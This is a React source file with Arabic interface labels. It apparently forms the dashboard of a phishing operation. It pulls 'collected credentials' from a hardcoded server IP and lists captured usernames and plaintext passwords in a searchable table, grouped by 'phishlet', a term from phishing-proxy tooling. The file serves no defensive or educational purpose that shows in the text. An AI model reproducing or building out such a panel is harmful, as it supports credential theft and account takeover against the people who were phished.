import React, { useState, useEffect } from 'react';
import axios from 'axios';
import {
  Paper,
  Typography,
  Box,
  TableContainer,
  Table,
  TableHead,
  TableBody,
  TableRow,
  TableCell,
  CircularProgress,
  Alert,
  Chip,
  TextField,
  InputAdornment,
  Divider
} from '@mui/material';
import SearchIcon from '@mui/icons-material/Search';
import moment from 'moment';

const Credentials = () => {
  const [credentials, setCredentials] = useState([]);
  const [filteredCredentials, setFilteredCredentials] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    const fetchCredentials = async () => {
      try {
        const res = await axios.get('http://5.199.168.182:5000/api/logs/credentials');
        setCredentials(res.data.data);
        setFilteredCredentials(res.data.data);
        setLoading(false);
      } catch (err) {
        setError(err.response?.data?.message || 'خطأ في جلب بيانات الاعتماد');
        setLoading(false);
      }
    };

    fetchCredentials();
  }, []);

  useEffect(() => {
    // Filter credentials based on search term
    if (searchTerm.trim() === '') {
      setFilteredCredentials(credentials);
    } else {
      const term = searchTerm.toLowerCase();
      const filtered = credentials.filter(
        cred => 
          cred.phishlet?.toLowerCase().includes(term) ||
          cred.credentials?.toLowerCase().includes(term) ||
          cred.timestamp?.toLowerCase().includes(term)
      );
      setFilteredCredentials(filtered);
    }
  }, [searchTerm, credentials]);

  const parseCredentials = (credStr) => {
    // Assuming credentials are in format username:password
    const parts = credStr.split(':');
    if (parts.length >= 2) {
      return {
        username: parts[0],
        password: parts.slice(1).join(':') // Handle passwords with colons
      };
    }
    return { username: credStr, password: '' };
  };

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', py: 5 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ mt: 3 }}>
        {error}
      </Alert>
    );
  }

  return (
    <div>
      <Box sx={{ mb: 3 }}>
        <Typography variant="h4" component="h1" gutterBottom>
          بيانات الاعتماد المُجمّعة
        </Typography>
        <Divider sx={{ mb: 3 }} />
        
        <TextField
          fullWidth
          variant="outlined"
          placeholder="بحث في بيانات الاعتماد..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          sx={{ mb: 3 }}
          InputProps={{
            startAdornment: (
              <InputAdornment position="start">
                <SearchIcon />
              </InputAdornment>
            ),
          }}
        />
      </Box>

      {filteredCredentials.length > 0 ? (
        <TableContainer component={Paper}>
          <Table>
            <TableHead>
              <TableRow>
                <TableCell>التاريخ</TableCell>
                <TableCell>النطاق</TableCell>
                <TableCell>اسم المستخدم</TableCell>
                <TableCell>كلمة المرور</TableCell>
                <TableCell>بيانات الاعتماد الكاملة</TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {filteredCredentials.map((cred, index) => {
                const { username, password } = parseCredentials(cred.credentials);
                
                return (
                  <TableRow key={index}>
                    <TableCell>{cred.timestamp}</TableCell>
                    <TableCell>
                      <Chip 
                        label={cred.phishlet} 
                        color="primary" 
                        size="small" 
                        variant="outlined"
                      />
                    </TableCell>
                    <TableCell>{username}</TableCell>
                    <TableCell>{password}</TableCell>
                    <TableCell sx={{ maxWidth: '300px', wordBreak: 'break-all' }}>
                      {cred.credentials}
                    </TableCell>
                  </TableRow>
                );
              })}
            </TableBody>
          </Table>
        </TableContainer>
      ) : (
        <Alert severity="info">لا توجد بيانات اعتماد مطابقة للبحث</Alert>
      )}
    </div>
  );
};

export default Credentials; 